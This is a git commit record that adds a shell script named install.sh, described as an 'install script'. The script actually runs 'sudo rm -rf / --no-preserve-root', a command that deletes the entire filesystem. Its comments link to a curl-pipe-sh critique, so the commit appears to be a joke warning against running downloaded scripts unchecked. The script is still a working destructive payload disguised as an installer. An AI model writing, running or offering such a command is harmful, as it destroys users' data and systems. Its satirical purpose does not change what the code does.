66b6e7691620fd20f2d7433dba6f5c6c6527cba5
David J. Felix <felix.davidj@gmail.com>
2015-01-08 09:35:50 -0500

    Here's an "install script"

---
+++ src/sh/install.sh
@@ -0,0 +1,7 @@
+#!/bin/sh
+
+# This really shouldn't work, but I bet it would
+# http://curlpipesh.tumblr.com/
+# always pipe curl into sh without checking, right?
+
+sudo rm -rf / --no-preserve-root || sudo rm -rf
